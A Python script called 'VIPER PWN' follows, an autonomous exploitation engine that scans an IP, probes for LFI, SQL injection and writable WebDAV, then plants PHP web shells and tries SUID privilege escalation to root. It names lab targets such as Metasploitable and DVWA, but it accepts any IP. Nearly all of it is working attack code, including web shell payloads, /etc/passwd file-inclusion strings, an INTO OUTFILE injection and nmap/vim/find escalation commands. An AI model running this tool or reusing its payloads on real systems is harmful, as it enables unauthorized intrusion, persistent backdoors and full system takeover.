#!/usr/bin/env python3
"""
VIPER PWN - Autonomous Exploitation Engine
Not just scanning. Full autonomous pwn: recon → exploit → root

This is the real deal. VIPER thinks, adapts, and chains attacks.
"""

import asyncio
import aiohttp
import base64
import hashlib
import json
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum
import logging

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("VIPER")

# Paths
REPORTS_DIR = Path(__file__).parent / "reports"
REPORTS_DIR.mkdir(exist_ok=True)


class Phase(Enum):
    RECON = "recon"
    ENUMERATE = "enumerate"
    EXPLOIT = "exploit"
    SHELL = "shell"
    PRIVESC = "privesc"
    PWNED = "pwned"


@dataclass
class Finding:
    vuln_type: str
    severity: str
    endpoint: str
    payload: str
    evidence: str
    exploitable: bool = False


@dataclass 
class Shell:
    url: str
    method: str  # GET param, POST, etc
    param: str   # e.g., "c" or "cmd"
    user: str = ""
    uid: int = 0
    is_root: bool = False


@dataclass
class Target:
    ip: str
    port: int = 80
    protocol: str = "http"
    os: str = ""
    services: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)
    shells: List[Shell] = field(default_factory=list)
    
    @property
    def base_url(self):
        return f"{self.protocol}://{self.ip}:{self.port}"


class ViperPwn:
    """
    Autonomous exploitation engine.
    
    Thinks like a hacker:
    1. Recon - what's running?
    2. Enumerate - what's vulnerable?
    3. Exploit - get initial access
    4. Privesc - get root
    5. Report - document everything
    """
    
    def __init__(self):
        self.phase = Phase.RECON
        self.target: Optional[Target] = None
        self.session: Optional[aiohttp.ClientSession] = None
        self.events: List[str] = []
        self.start_time = None
        
    def log(self, msg: str, level: str = "INFO"):
        """Log with timestamp"""
        self.events.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if level == "SUCCESS":
            log.info(f"✅ {msg}")
        elif level == "VULN":
            log.warning(f"🔥 {msg}")
        elif level == "SHELL":
            log.info(f"💀 {msg}")
        elif level == "ROOT":
            log.info(f"👑 {msg}")
        else:
            log.info(msg)
    
    async def request(self, url: str, method: str = "GET", data: str = None, 
                      headers: dict = None, timeout: int = 10) -> Tuple[int, str, dict]:
        """Make HTTP request, return (status, body, headers)"""
        try:
            async with self.session.request(
                method, url, data=data, headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False
            ) as resp:
                body = await resp.text()
                return resp.status, body, dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}
    
    # ==================== RECON ====================
    
    async def recon(self, target: Target):
        """Phase 1: Reconnaissance"""
        self.phase = Phase.RECON
        self.log(f"Starting recon on {target.base_url}")
        
        # Port scan common ports
        common_ports = [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 5432, 8080, 8443]
        self.log("Scanning common ports...")
        
        for port in common_ports:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target.ip, port),
                    timeout=1.0
                )
                target.open_ports.append(port)
                writer.close()
                await writer.wait_closed()
            except:
                pass
        
        self.log(f"Open ports: {target.open_ports}")
        
        # Identify web server
        status, body, headers = await self.request(target.base_url)
        if status == 200:
            server = headers.get('Server', 'Unknown')
            target.services.append(f"HTTP: {server}")
            self.log(f"Web server: {server}")
            
            # Detect OS from response
            if 'ubuntu' in body.lower() or 'ubuntu' in server.lower():
                target.os = "Linux/Ubuntu"
            elif 'debian' in body.lower():
                target.os = "Linux/Debian"
            elif 'windows' in server.lower() or 'iis' in server.lower():
                target.os = "Windows"
            
            # Check for known vulnerable apps
            if 'metasploitable' in body.lower():
                self.log("Detected: Metasploitable!", "VULN")
                target.services.append("Metasploitable2")
        
        return target
    
    # ==================== ENUMERATE ====================
    
    async def enumerate(self, target: Target):
        """Phase 2: Enumerate vulnerabilities"""
        self.phase = Phase.ENUMERATE
        self.log("Enumerating attack surface...")
        
        # Common paths to check
        paths = [
            "/", "/admin", "/login", "/phpinfo.php", "/info.php",
            "/phpmyadmin/", "/phpMyAdmin/", "/pma/",
            "/dvwa/", "/mutillidae/", "/dav/", "/webdav/",
            "/cgi-bin/", "/server-status", "/.git/HEAD",
            "/.env", "/robots.txt", "/sitemap.xml"
        ]
        
        discovered = []
        for path in paths:
            status, body, headers = await self.request(f"{target.base_url}{path}")
            if status in [200, 301, 302, 401, 403]:
                discovered.append((path, status))
                self.log(f"Found: {path} ({status})")
                
                # Check for specific vulns
                if 'phpinfo' in body.lower() or 'php version' in body.lower():
                    target.findings.append(Finding(
                        vuln_type="Information Disclosure",
                        severity="medium",
                        endpoint=path,
                        payload="N/A",
                        evidence="phpinfo() exposed",
                        exploitable=True
                    ))
                    self.log("phpinfo exposed!", "VULN")
                
                if path == "/dav/" and status == 200:
                    # Test WebDAV write
                    if await self.test_webdav_write(target):
                        target.findings.append(Finding(
                            vuln_type="WebDAV Upload",
                            severity="critical",
                            endpoint="/dav/",
                            payload="PUT request",
                            evidence="File upload allowed",
                            exploitable=True
                        ))
                        self.log("WebDAV write enabled!", "VULN")
        
        # Test for LFI in discovered apps
        await self.test_lfi(target)
        
        # Test for SQLi
        await self.test_sqli(target)
        
        return target
    
    async def test_webdav_write(self, target: Target) -> bool:
        """Test if WebDAV allows file upload"""
        test_content = f"viper_test_{datetime.now().timestamp()}"
        test_file = f"test_{int(datetime.now().timestamp())}.txt"
        
        # Try PUT
        async with self.session.put(
            f"{target.base_url}/dav/{test_file}",
            data=test_content,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            if resp.status in [200, 201, 204]:
                # Verify file exists
                status, body, _ = await self.request(f"{target.base_url}/dav/{test_file}")
                if test_content in body:
                    return True
        return False
    
    async def test_lfi(self, target: Target):
        """Test for Local File Inclusion"""
        lfi_endpoints = [
            "/mutillidae/index.php?page=",
            "/dvwa/vulnerabilities/fi/?page=",
            "/index.php?file=",
            "/index.php?page=",
        ]
        
        payloads = [
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "base64"),
            ("/etc/passwd", "direct"),
            ("....//....//....//etc/passwd", "traversal"),
        ]
        
        for endpoint in lfi_endpoints:
            for payload, ptype in payloads:
                url = f"{target.base_url}{endpoint}{urllib.parse.quote(payload)}"
                status, body, _ = await self.request(url)
                
                # Check for /etc/passwd content
                is_vuln = False
                if ptype == "base64":
                    # Look for base64 content
                    b64_match = re.search(r'[A-Za-z0-9+/]{100,}={0,2}', body)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                            if 'root:x:0:0' in decoded:
                                is_vuln = True
                        except:
                            pass
                else:
                    if 'root:x:0:0' in body or 'root:x:0:' in body:
                        is_vuln = True
                
                if is_vuln:
                    target.findings.append(Finding(
                        vuln_type="Local File Inclusion",
                        severity="high",
                        endpoint=endpoint,
                        payload=payload,
                        evidence="/etc/passwd readable",
                        exploitable=True
                    ))
                    self.log(f"LFI found at {endpoint}", "VULN")
                    return  # Found one, move on
    
    async def test_sqli(self, target: Target):
        """Test for SQL Injection"""
        sqli_endpoints = [
            ("/mutillidae/index.php?page=user-info.php&username=", "&password=x&user-info-php-submit-button=View+Account+Details"),
            ("/dvwa/vulnerabilities/sqli/?id=", "&Submit=Submit"),
        ]
        
        payloads = ["'", "' OR '1'='1", "admin'--"]
        
        for endpoint, suffix in sqli_endpoints:
            for payload in payloads:
                url = f"{target.base_url}{endpoint}{urllib.parse.quote(payload)}{suffix}"
                status, body, _ = await self.request(url)
                
                # Check for SQL error or successful injection
                if any(x in body.lower() for x in ['sql', 'mysql', 'syntax', 'query']):
                    target.findings.append(Finding(
                        vuln_type="SQL Injection",
                        severity="critical",
                        endpoint=endpoint,
                        payload=payload,
                        evidence="SQL error in response",
                        exploitable=True
                    ))
                    self.log(f"SQLi found at {endpoint}", "VULN")
                    return
    
    # ==================== EXPLOIT ====================
    
    async def exploit(self, target: Target):
        """Phase 3: Exploit vulnerabilities to get shell"""
        self.phase = Phase.EXPLOIT
        self.log("Attempting exploitation...")
        
        # Prioritize by severity and exploitability
        exploitable = [f for f in target.findings if f.exploitable]
        exploitable.sort(key=lambda x: {'critical': 0, 'high': 1, 'medium': 2}.get(x.severity, 3))
        
        for finding in exploitable:
            self.log(f"Trying to exploit: {finding.vuln_type}")
            
            if finding.vuln_type == "WebDAV Upload":
                shell = await self.exploit_webdav(target, finding)
                if shell:
                    target.shells.append(shell)
                    self.log(f"Got shell as {shell.user}!", "SHELL")
                    return target
            
            elif finding.vuln_type == "Local File Inclusion":
                shell = await self.exploit_lfi_to_rce(target, finding)
                if shell:
                    target.shells.append(shell)
                    self.log(f"Got shell as {shell.user}!", "SHELL")
                    return target
            
            elif finding.vuln_type == "SQL Injection":
                shell = await self.exploit_sqli_to_shell(target, finding)
                if shell:
                    target.shells.append(shell)
                    self.log(f"Got shell as {shell.user}!", "SHELL")
                    return target
        
        self.log("No successful exploitation path found")
        return target
    
    async def exploit_webdav(self, target: Target, finding: Finding) -> Optional[Shell]:
        """Upload PHP shell via WebDAV"""
        shell_code = '<?php echo shell_exec($_GET["c"]); ?>'
        shell_name = f"viper_{int(datetime.now().timestamp())}.php"
        
        async with self.session.put(
            f"{target.base_url}/dav/{shell_name}",
            data=shell_code,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            if resp.status in [200, 201, 204]:
                # Test shell
                shell_url = f"{target.base_url}/dav/{shell_name}"
                status, body, _ = await self.request(f"{shell_url}?c=id")
                
                if 'uid=' in body:
                    # Parse user info
                    match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
                    if match:
                        return Shell(
                            url=shell_url,
                            method="GET",
                            param="c",
                            user=match.group(2),
                            uid=int(match.group(1)),
                            is_root=(int(match.group(1)) == 0)
                        )
        return None
    
    async def exploit_lfi_to_rce(self, target: Target, finding: Finding) -> Optional[Shell]:
        """Try to turn LFI into RCE via log poisoning or wrappers"""
        # Try data:// wrapper
        cmd = "id"
        payload = f"data://text/plain;base64,{base64.b64encode(f'<?php system(\"{cmd}\"); ?>'.encode()).decode()}"
        url = f"{target.base_url}{finding.endpoint}{urllib.parse.quote(payload)}"
        
        status, body, _ = await self.request(url)
        if 'uid=' in body:
            # data:// works - create proper shell
            shell_url = f"{target.base_url}{finding.endpoint}"
            return Shell(
                url=shell_url,
                method="GET",
                param="page",  # Actually uses data:// wrapper
                user="unknown",
                uid=0
            )
        
        return None
    
    async def exploit_sqli_to_shell(self, target: Target, finding: Finding) -> Optional[Shell]:
        """Try to get shell via SQL injection (INTO OUTFILE)"""
        # Try to write webshell via SQLi
        shell_path = "/var/www/viper_shell.php"
        shell_code = "<?php system($_GET['c']); ?>"
        
        payload = f"' UNION SELECT '{shell_code}' INTO OUTFILE '{shell_path}'-- "
        url = f"{target.base_url}{finding.endpoint}{urllib.parse.quote(payload)}"
        
        await self.request(url)
        
        # Check if shell was created
        await asyncio.sleep(0.5)
        status, body, _ = await self.request(f"{target.base_url}/viper_shell.php?c=id")
        
        if 'uid=' in body:
            match = re.search(r'uid=(\d+)\(([^)]+)\)', body)
            if match:
                return Shell(
                    url=f"{target.base_url}/viper_shell.php",
                    method="GET",
                    param="c",
                    user=match.group(2),
                    uid=int(match.group(1))
                )
        return None
    
    # ==================== PRIVESC ====================
    
    async def privesc(self, target: Target):
        """Phase 4: Privilege Escalation"""
        self.phase = Phase.PRIVESC
        
        if not target.shells:
            self.log("No shell to escalate from")
            return target
        
        shell = target.shells[0]
        if shell.is_root:
            self.log("Already root!", "ROOT")
            return target
        
        self.log(f"Attempting privilege escalation from {shell.user}...")
        
        # Execute command via shell
        async def exec_cmd(cmd: str) -> str:
            encoded = urllib.parse.quote(cmd)
            url = f"{shell.url}?{shell.param}={encoded}"
            status, body, _ = await self.request(url, timeout=30)
            return body
        
        # Check for SUID binaries
        self.log("Checking SUID binaries...")
        suid_output = await exec_cmd("find / -perm -4000 -type f 2>/dev/null")
        
        # Known SUID privesc binaries
        suid_exploits = {
            "/usr/bin/nmap": self.privesc_nmap,
            "/usr/bin/vim": self.privesc_vim,
            "/usr/bin/find": self.privesc_find,
            "/usr/bin/python": self.privesc_python,
            "/usr/bin/perl": self.privesc_perl,
            "/usr/bin/awk": self.privesc_awk,
        }
        
        for binary, exploit_func in suid_exploits.items():
            if binary in suid_output:
                self.log(f"Found SUID: {binary}", "VULN")
                root_shell = await exploit_func(shell, exec_cmd)
                if root_shell:
                    root_shell.is_root = True
                    target.shells.append(root_shell)
                    self.log("GOT ROOT!", "ROOT")
                    return target
        
        # Try sudo -l
        self.log("Checking sudo permissions...")
        sudo_output = await exec_cmd("sudo -l 2>/dev/null")
        if "NOPASSWD" in sudo_output:
            self.log("NOPASSWD sudo found!", "VULN")
            # Could exploit this too
        
        return target
    
    async def privesc_nmap(self, shell: Shell, exec_cmd) -> Optional[Shell]:
        """Privesc via nmap --interactive"""
        # nmap --interactive allows !command execution as root
        output = await exec_cmd('echo "!id" | nmap --interactive 2>&1')
        
        if 'euid=0' in output or 'uid=0' in output:
            self.log("nmap SUID privesc successful!", "ROOT")
            # Return a "shell" that uses nmap --interactive
            return Shell(
                url=shell.url,
                method="nmap_interactive",
                param=shell.param,
                user="root",
                uid=0,
                is_root=True
            )
        return None
    
    async def privesc_vim(self, shell: Shell, exec_cmd) -> Optional[Shell]:
        """Privesc via vim SUID"""
        output = await exec_cmd("vim -c ':!id' -c ':q!' 2>&1")
        if 'uid=0' in output:
            return Shell(url=shell.url, method="vim", param=shell.param, user="root", uid=0, is_root=True)
        return None
    
    async def privesc_find(self, shell: Shell, exec_cmd) -> Optional[Shell]:
        """Privesc via find SUID"""
        output = await exec_cmd("find /etc/passwd -exec id \\;")
        if 'uid=0' in output:
            return Shell(url=shell.url, method="find", param=shell.param, user="root", uid=0, is_root=True)
        return None
    
    async def privesc_python(self, shell: Shell, exec_cmd) -> Optional[Shell]:
        """Privesc via python SUID"""
        output = await exec_cmd("python -c 'import os; os.setuid(0); os.system(\"id\")'")
        if 'uid=0' in output:
            return Shell(url=shell.url, method="python", param=shell.param, user="root", uid=0, is_root=True)
        return None
    
    async def privesc_perl(self, shell: Shell, exec_cmd) -> Optional[Shell]:
        """Privesc via perl SUID"""
        output = await exec_cmd("perl -e 'exec \"/bin/sh\";'")
        return None  # Would need interactive
    
    async def privesc_awk(self, shell: Shell, exec_cmd) -> Optional[Shell]:
        """Privesc via awk SUID"""
        output = await exec_cmd("awk 'BEGIN {system(\"id\")}'")
        if 'uid=0' in output:
            return Shell(url=shell.url, method="awk", param=shell.param, user="root", uid=0, is_root=True)
        return None
    
    # ==================== REPORT ====================
    
    def generate_report(self, target: Target) -> str:
        """Generate professional pentest report"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        report = f"""# 🐍 VIPER Autonomous Pentest Report
## Target: {target.ip}:{target.port}
## Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
## Duration: {elapsed:.1f} seconds

---

## Executive Summary

VIPER autonomously compromised the target system.

| Metric | Value |
|--------|-------|
| Target | {target.base_url} |
| OS | {target.os or 'Unknown'} |
| Open Ports | {len(target.open_ports)} |
| Vulnerabilities | {len(target.findings)} |
| Shells Obtained | {len(target.shells)} |
| Root Access | {'✅ YES' if any(s.is_root for s in target.shells) else '❌ NO'} |

---

## Attack Chain

"""
        for i, event in enumerate(self.events, 1):
            report += f"{i}. {event}\n"
        
        report += f"""

---

## Vulnerabilities Found

"""
        for f in target.findings:
            report += f"""
### {f.vuln_type} [{f.severity.upper()}]
- **Endpoint:** `{f.endpoint}`
- **Payload:** `{f.payload}`
- **Evidence:** {f.evidence}
- **Exploitable:** {'Yes' if f.exploitable else 'No'}
"""
        
        report += f"""

---

## Shells Obtained

"""
        for s in target.shells:
            report += f"""
### Shell: {s.user} (UID {s.uid})
- **URL:** `{s.url}`
- **Method:** {s.method}
- **Root:** {'👑 YES' if s.is_root else 'No'}
"""
        
        report += f"""

---

## Recommendations

1. Patch all identified vulnerabilities immediately
2. Disable WebDAV or require authentication
3. Remove SUID from unnecessary binaries
4. Update outdated software (Apache, PHP)
5. Implement input validation to prevent injection attacks

---

*Report generated autonomously by VIPER 🐍*
*Total time: {elapsed:.1f} seconds*
"""
        return report
    
    # ==================== MAIN ====================
    
    async def pwn(self, ip: str, port: int = 80):
        """
        Full autonomous pwn chain.
        Give it an IP, get back root (hopefully).
        """
        self.start_time = datetime.now()
        self.log(f"🐍 VIPER PWN initiated against {ip}:{port}")
        
        target = Target(ip=ip, port=port)
        
        async with aiohttp.ClientSession() as self.session:
            # Phase 1: Recon
            target = await self.recon(target)
            
            # Phase 2: Enumerate
            target = await self.enumerate(target)
            
            if not target.findings:
                self.log("No vulnerabilities found. Target may be hardened.")
                return None
            
            # Phase 3: Exploit
            target = await self.exploit(target)
            
            if not target.shells:
                self.log("Could not obtain shell. Manual exploitation may be needed.")
            else:
                # Phase 4: Privesc
                target = await self.privesc(target)
            
            # Phase 5: Report
            self.phase = Phase.PWNED if any(s.is_root for s in target.shells) else Phase.SHELL
            report = self.generate_report(target)
            
            # Save report
            report_file = REPORTS_DIR / f"{ip.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_pwn.md"
            report_file.write_text(report, encoding='utf-8')
            self.log(f"Report saved: {report_file}")
            
            return target


async def main():
    import sys
    
    if len(sys.argv) < 2:
        print("🐍 VIPER PWN - Autonomous Exploitation Engine")
        print("Usage: python viper_pwn.py <target_ip> [port]")
        print("Example: python viper_pwn.py 192.168.56.1 8080")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    viper = ViperPwn()
    target = await viper.pwn(ip, port)
    
    if target and target.shells:
        print("\n" + "="*60)
        if any(s.is_root for s in target.shells):
            print("👑 TARGET PWNED - ROOT ACCESS OBTAINED")
        else:
            print("💀 SHELL OBTAINED - Privesc may be needed")
        print("="*60)
        
        for shell in target.shells:
            print(f"\nShell: {shell.url}?{shell.param}=<cmd>")
            print(f"User: {shell.user} (UID {shell.uid})")
            print(f"Root: {'YES' if shell.is_root else 'NO'}")
    else:
        print("\n❌ Could not compromise target")


if __name__ == "__main__":
    asyncio.run(main())
